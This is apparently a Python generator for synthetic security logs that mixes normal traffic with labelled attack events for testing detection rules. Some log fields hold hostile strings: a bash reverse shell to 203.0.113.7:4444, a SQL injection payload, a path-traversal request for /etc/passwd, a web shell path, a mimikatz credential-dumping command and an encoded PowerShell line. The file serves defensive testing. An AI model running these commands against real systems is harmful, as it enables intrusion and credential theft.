"""Generates a realistic mixed normalized-log file with embedded attacks.
Run: python sample_data/generate_sample.py"""
import json, os, random
from datetime import datetime, timedelta, timezone

random.seed(7)
T0 = datetime(2026, 10, 4, 9, 0, 0, tzinfo=timezone.utc)
out = []


def add(sec, log_type, **f):
    out.append({"timestamp": (T0 + timedelta(seconds=sec)).isoformat(), "log_type": log_type, **f})


# ---- normal background traffic ----
for i in range(120):
    t = i * 10
    add(t, "firewall", src_ip="10.0.1.%d" % random.randint(10, 50), dst_ip="8.8.8.8", dst_port=443, action="allow")
    add(t, "dns", src_ip="10.0.1.%d" % random.randint(10, 50), query="www.google.com", record_type="A")
    add(t, "web_server", src_ip="192.168.5.%d" % random.randint(2, 9), url="/index.html", status_code=200, user_agent="Mozilla/5.0")
    if i % 5 == 0:
        add(t, "authentication", src_ip="10.0.1.20", user="alice", status="success", geo_country="IN")
        add(t, "dhcp", action="offer", server_ip="10.0.0.1", mac="aa:bb:cc:00:00:01")
        add(t, "application", app="billing", level="info", event="login", user="alice", user_role="admin", src_ip="10.0.1.20")
        add(t, "network_flow", src_ip="10.0.1.21", dst_ip="52.1.1.1", dst_port=443, bytes_out=20000, direction="outbound")
        add(t, "windows", host="WS-01", user="alice", event_id=4624)
        add(t, "linux", host="web01", src_ip="10.0.1.20", user="alice", message="Accepted publickey for alice")
        add(t, "ids_ips", src_ip="10.0.1.5", signature="INFO Policy", priority=3)
        add(t, "file_audit", host="WS-01", user="alice", action="read", file_path="C:/docs/a.docx")
        add(t, "endpoint_edr", host="WS-01", user="alice", process_name="chrome.exe", parent_process="explorer.exe", command_line="chrome.exe")

# ---- attacks ----
A = "203.0.113.50"
for p in range(20):                                             # FW-001 port scan
    add(100 + p, "firewall", src_ip=A, dst_ip="10.0.0.5", dst_port=20 + p, action="deny")
for i in range(8):                                              # LNX-001 SSH brute force
    add(200 + i * 3, "linux", host="web01", src_ip="198.51.100.9", user="root", message="Failed password for root from 198.51.100.9")
add(260, "linux", host="web01", user="bob", message="bash -i >& /dev/tcp/203.0.113.7/4444 0>&1")  # LNX-003
for i in range(6):                                              # AUTH-003 brute force then success
    add(300 + i * 5, "authentication", src_ip="45.9.9.9", user="carol", status="failure", geo_country="RU")
add(335, "authentication", src_ip="45.9.9.9", user="carol", status="success", geo_country="RU")
for i, u in enumerate(["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"]):  # AUTH-002 spraying
    add(400 + i * 4, "authentication", src_ip="91.20.20.20", user=u, status="failure", geo_country="NL")
add(500, "web_server", src_ip="185.1.1.1", url="/items?id=1' UNION SELECT user,pass FROM users--", status_code=500, user_agent="sqlmap/1.7")
add(510, "web_server", src_ip="185.1.1.1", url="/../../etc/passwd", status_code=404, user_agent="curl/8")
add(520, "web_server", src_ip="185.1.1.2", url="/uploads/c99.php", status_code=200, user_agent="Mozilla/5.0")
for i in range(35):                                             # DNS-002 tunneling
    add(600 + i, "dns", src_ip="10.0.1.77", query="x%d.tunnel.example" % i, record_type="TXT")
add(640, "dns", src_ip="10.0.1.78", query="a8f3k29dk39sk20dk39slw92kd.com", record_type="A")   # DGA
add(650, "dns", src_ip="10.0.1.79", query="evil-c2.example", record_type="A")                  # DNS-003
add(700, "dhcp", action="offer", server_ip="10.0.0.99", mac="de:ad:be:ef:00:01")               # rogue DHCP
add(720, "network_flow", src_ip="10.0.1.30", dst_ip="94.1.1.1", dst_port=443, bytes_out=900000000, direction="outbound")
add(730, "network_flow", src_ip="10.0.1.31", dst_ip="94.2.2.2", dst_port=4444, bytes_out=500, direction="outbound")
add(740, "ids_ips", src_ip="203.0.113.99", signature="ET EXPLOIT Log4j RCE", priority=1)
add(800, "windows", host="DC01", user="mallory", event_id=1102)                                # log cleared
add(805, "windows", host="DC01", user="mallory", event_id=4732)                                # admin group
add(850, "endpoint_edr", host="WS-02", user="dave", process_name="powershell.exe", parent_process="winword.exe",
    command_line="powershell.exe -enc SQBFAFgAIAAoA...")                                       # EDR-001 + 003
add(860, "endpoint_edr", host="WS-02", user="dave", process_name="rundll32.exe", parent_process="cmd.exe",
    command_line="mimikatz sekurlsa::logonpasswords")                                          # EDR-002
for i in range(60):                                             # FILE-001 ransomware
    add(900 + i * 0.3, "file_audit", host="FS01", user="svc_backup", action="rename", file_path="D:/share/doc%d.docx.locked" % i)
for i in range(25):                                             # APP-001 API abuse
    add(1000 + i, "application", app="api", level="warn", event="rate_limit_exceeded", src_ip="77.7.7.7")
add(1050, "application", app="portal", level="info", event="role_changed", user="eve", user_role="user", src_ip="10.0.1.60")

out.sort(key=lambda e: e["timestamp"])
path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "normalized_logs.jsonl")
with open(path, "w") as fh:
    for e in out:
        fh.write(json.dumps(e) + "\n")
print(f"Wrote {len(out)} events to {path}")
